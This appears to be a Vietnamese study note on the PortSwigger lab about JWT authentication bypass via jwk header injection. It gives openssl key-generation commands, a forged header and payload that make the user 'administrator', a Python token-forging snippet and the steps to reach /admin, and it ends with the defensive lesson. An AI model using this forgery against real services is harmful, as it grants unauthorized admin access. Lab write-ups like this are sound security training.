![[jwt-jwk.png]]
-mô tả lab: server chịu nhúng `jwk` (public key) từ header token vào để verify. Mình tự tạo cặp key, nhét public key mình vào token, ký bằng private key mình.

> [!NOTE]
> -test bằng `wiener:peter`. Lab: https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection

### hướng giải
- [ ] mình login rồi decode JWT, mình thấy header RS256 bình thường, chưa có `jwk`
- [ ] mình đọc doc của lab + thử thêm `jwk` vào header rồi ký bằng key lạ, sau đó quan sát gói tin trả về, mình thấy server nhận -> nó trust key client nhúng vào thật
- [ ] => mình tự sinh 1 cặp RSA, nhét public vào header `jwk`, sửa `sub=administrator`, ký RS256 bằng private của mình là xong. Server lấy đúng key mình nhét vào để verify nên khớp 100%.

### giải
-bước 1: mình tạo cặp key (JWT Editor Keys có nút Generate, hoặc openssl):
```bash
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
```

-bước 2: trong JWT Editor, mình dùng attack **Embedded JWK**:
- nó tự sinh key + nhúng public JWK vào header
- header thành: `{"alg":"RS256","jwk":{"kty":"RSA","n":"...key-minh...","e":"AQAB"},"kid":"..."}`
- payload: `{"iss":"portswigger","sub":"administrator","exp":9999999999}`
- ký bằng private key vừa sinh.
![[jwt-jwk-embedded.png]]

-bước 3: thay cookie, GET `/admin` -> 200, xóa carlos là solve.

-cách python của mình:
```python
import jwt
priv = open("private.pem").read()
pub_numbers = ...  # build jwk dict từ public key
token = jwt.encode({"iss":"portswigger","sub":"administrator","exp":9999999999},
                   priv, algorithm="RS256",
                   headers={"jwk": MY_JWK_DICT, "kid":"KID_GOC"})
```

> [!NOTE]
> -bài học của mình: `jwk`/`jku`/`x5u` trong header là trust client hoàn toàn, attacker tự cấp key cho chính mình. Server chỉ được trust key trong kho của mình (`jwks.json` nội bộ / config cứng).
